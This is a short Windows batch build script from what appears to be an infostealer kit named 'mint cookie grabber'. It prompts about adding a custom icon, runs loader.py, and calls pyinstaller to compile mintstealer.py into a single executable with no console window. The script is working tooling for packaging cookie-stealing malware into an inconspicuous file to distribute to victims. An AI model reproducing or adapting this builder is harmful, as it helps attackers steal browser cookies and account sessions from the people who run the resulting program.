@ECHO OFF

:choice
set /P c=Are you sure you want to build with an icon[Y/N]?
if /I "%c%" EQU "Y" goto :yes
if /I "%c%" EQU "N" goto :no_build
goto :choice

:yes

set /P c=type in the letter "y" if you understand in order to make one with a icon make a .ico file in mint cookie grabber folder and name it "ico"
if /I "%c%" EQU "y" goto :build

:build

loader.py
pyinstaller --onefile -w -i "ico.ico" mintstealer.py
goto :finish
pause
exit

:no_build

echo build has cancelled
pause
exit

:finish

echo build has finished
pause
exit
